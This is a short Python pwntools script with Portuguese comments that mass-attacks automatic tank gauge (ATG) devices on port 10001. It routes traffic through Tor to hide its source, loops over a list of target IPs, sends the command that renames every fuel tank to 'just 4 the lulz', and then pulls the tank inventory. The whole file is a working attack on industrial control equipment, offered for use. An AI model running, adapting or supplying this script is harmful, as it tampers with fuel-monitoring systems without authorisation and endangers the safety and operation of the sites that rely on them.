#	Made by: Pr1mus and R1se
#
#	Telegram: @ozym4ndias @Risezin

from pwn import *
from time import sleep

#	no IpsList coloque quantos ip's vc quiser, precisam estar claro entre 
#	aspas e separados por virgulas.
IpsList = [coloque os ips aqui]

# Usando ip do Tor pra fazer as conexoes
context.proxy = (socks.SOCKS5, 'localhost', 9050)
wg = wget('https://ipinfo.io/ip')

if wg is None:
  exit()

print "your ip: %s" % wg

sleep(4)

# Tenta se conectar em todos os ip's da lista na porta 10001(default do ATG)
# se um dos ip's derem algum erro ele sera ignorado e o script vai pro prox ip.
for L in IpsList:
	try:
		r = remote(L, 10001)
		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') # muda o nome de todos os tanques pra "just 4 the lulz"
								# vc pode trocar essa frase por qualquer uma que quiser
		r.send('\x01'+'I20100\r\n') # lista todos os tanques
		r.recvuntil(' ', drop=True)	
		
		response = r.recv(4029)
		print "\tresponse = %s" % response
	
		r.close()
	except Exception:
		None
